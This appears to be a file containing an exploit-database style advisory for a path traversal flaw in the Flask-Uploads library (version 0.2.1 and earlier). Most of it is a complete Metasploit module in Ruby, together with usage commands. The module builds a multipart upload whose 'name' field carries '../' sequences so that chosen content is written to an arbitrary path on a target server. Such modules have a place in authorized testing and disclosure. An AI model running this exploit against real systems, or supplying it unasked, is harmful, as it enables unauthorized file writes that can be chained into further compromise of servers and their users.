@@ -1,0 +1,130 @@
+=============================================================================================================================================
+| # Title     : Flask-Uploads <= 0.2.1 Path Traversal to Arbitrary File Write                                                               |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://github.com/maxcountryman/flask-uploads                                                                              |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/214228/ 
+
+[+] Summary    :  This Metasploit module exploits a path traversal vulnerability in the Flask-Uploads library versions 0.2.1 and earlier.
+                  The issue stems from insufficient sanitization of the name parameter used in the save() method of the UploadSet class, 
+				  allowing an attacker to traverse directories and write arbitrary files outside the intended upload directory.
+                  The module is designed strictly to demonstrate arbitrary file write capability and does not assume or attempt remote code execution. 
+				  File execution depends entirely on application logic, server configuration, and file placement, which are intentionally left out of scope.
+                  Successful exploitation may result in unauthorized file creation on the target filesystem, 
+				  potentially enabling further attacks when chained with additional vulnerabilities.
+
+[+] Usage : 
+
+use exploit/multi/http/flask_uploads_traversal
+set RHOSTS <TARGET_IP>
+set RPORT <TARGET_PORT>
+set TARGETURI /upload
+exploit
+
+[+] POC :
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = AverageRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'           => 'Flask-Uploads <= 0.2.1 Path Traversal Arbitrary File Write',
+        'Description'    => %q{
+          This module exploits a path traversal vulnerability in the Flask-Uploads 
+          library (version 0.2.1 and prior). The vulnerability allows for arbitrary 
+          file writes outside of the intended upload directory by manipulating the 
+          'name' parameter passed to the save() function. This module focuses on 
+          the file write primitive.
+        },
+        'Author'         => ['indoushka'],
+        'License'        => MSF_LICENSE,
+        'References'     => [
+          ['URL', 'https://github.com/maxcountryman/flask-uploads/issues/43']
+        ],
+        'Privileged'     => false,
+        'Platform'       => %w[linux win unix],
+        'Arch'           => ARCH_ALL,
+        'Targets'        => [['Generic Arbitrary File Write', {}]],
+        'DisclosureDate' => '2024-10-25',
+        'Notes'          => {
+          'Stability'   => [CRASH_SAFE],
+          'Reliability' => [], # No session guaranteed
+          'SideEffects' => [ARTIFACTS_ON_DISK]
+        }
+      )
+    )
+
+    register_options([
+      OptString.new('TARGETURI', [true, 'The vulnerable endpoint URL', '/upload']),
+      OptString.new('FIELD_NAME', [true, 'The multipart field name for the file upload', 'files']),
+      OptString.new('TRAVERSAL_DEPTH', [true, 'Depth of path traversal to reach root', '10']),
+      OptString.new('REMOTE_PATH', [true, 'The target path on the remote system', '/tmp/pwned.txt']),
+      OptString.new('FILE_CONTENT', [true, 'Content to write to the remote file', 'Vulnerability Confirmed'])
+    ])
+  end
+
+  def check
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path)
+    })
+    return CheckCode::Unknown('No response from the target.') unless res
+    
+    if res.code == 200
+      return CheckCode::Detected("Endpoint #{target_uri.path} is reachable.")
+    end
+
+    CheckCode::Safe
+  end
+
+  def exploit
+
+    traversal = "../" * datastore['TRAVERSAL_DEPTH'].to_i
+    remote_filename = datastore['REMOTE_PATH'].sub(%r{^/}, '')
+    malicious_name = "#{traversal}#{remote_filename}"
+
+    data = Rex::MIME::Message.new
+
+    data.add_part(
+      datastore['FILE_CONTENT'], 
+      'text/plain', 
+      nil, 
+      "form-data; name=\"#{datastore['FIELD_NAME']}\"; filename=\"test.txt\""
+    )
+
+    data.add_part(malicious_name, nil, nil, "form-data; name=\"name\"")
+
+    print_status("Attempting to write #{datastore['FILE_CONTENT'].length} bytes to #{datastore['REMOTE_PATH']}...")
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path),
+      'ctype'  => "multipart/form-data; boundary=#{data.bound}",
+      'data'   => data.to_s
+    })
+
+    if res && res.code == 200
+      print_good("Server responded with 200 OK. Verification required at: #{datastore['REMOTE_PATH']}")
+    else
+      status = res ? res.code : 'no response'
+      fail_with(Failure::UnexpectedReply, "Server responded with #{status}. Exploitation failed.")
+    end
+  end
+end
+
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
